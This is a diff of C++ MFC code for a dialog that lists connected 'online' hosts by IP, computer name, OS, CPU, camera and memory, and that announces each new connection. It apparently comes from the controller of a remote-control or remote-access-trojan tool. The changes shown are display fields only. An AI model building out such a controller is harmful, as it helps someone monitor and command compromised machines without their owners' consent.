@@ -37,7 +37,7 @@ COLUMNSTRUCT g_Column_Online[]=
 	{"操作系统",       140},
 	{"CPU",            140 },
 	{"摄像头",         140 },
-	{"PING",           140 }
+	{"内存",           140 }
 };
 int g_Column_Online_Count=7;//列表项的个数
 int g_Column_Online_Sumsize=0;//记录列表的总长度
@@ -363,7 +363,7 @@ int CMaizangDlg::InitList()
 
 
 //添加上线列表的一行小目录 起到区间分割作用的那些  添加上线主机
-void CMaizangDlg::AddOnlineList(SOCKET socket, CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)
+void CMaizangDlg::AddOnlineList(SOCKET socket, CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strMemSz)
 {
 	m_List_Online.InsertItem(0,strIP);//默认为0行 这样所有插入的新列都在最上面
 	m_List_Online.SetItemData(0, (DWORD)socket);
@@ -372,7 +372,7 @@ void CMaizangDlg::AddOnlineList(SOCKET socket, CString strIP, CString strAddr, C
 	m_List_Online.SetItemText(0,ONLINELIST_OS,strOS);
 	m_List_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
 	m_List_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
-	m_List_Online.SetItemText(0,ONLINELIST_PING,strPing);
+	m_List_Online.SetItemText(0,ONLINELIST_MEMORY,strMemSz);
 }
 
 
@@ -955,9 +955,9 @@ unsigned __stdcall  AcceptSocket(void   *pvoid)
 			getpeername(socket, (sockaddr *)&addr, &sz);
 			
 			CString OnLineIP;
-			OnLineIP.Format("%s:%u", inet_ntoa(addr.sin_addr), (DWORD)ntohs(addr.sin_port));
+			OnLineIP.Format("%s", inet_ntoa(addr.sin_addr));
  
-			This->AddOnlineList(socket, OnLineIP, "", m_SysInfo.cComputer, m_SysInfo.cOs,"", "", "");// CString strCPU, CString strVideo, CString strPing);
+			This->AddOnlineList(socket, OnLineIP, "", m_SysInfo.computerName, m_SysInfo.osVersion,m_SysInfo.cpuInfo, m_SysInfo.hasCamera, m_SysInfo.memorySize);// CString strCPU, CString strVideo, CString strPing);
 	        CString OnlineMessage;
 			OnlineMessage.Format("有主机 %s 上线请注意",OnLineIP);
             This->ShowMessage(true, OnlineMessage);
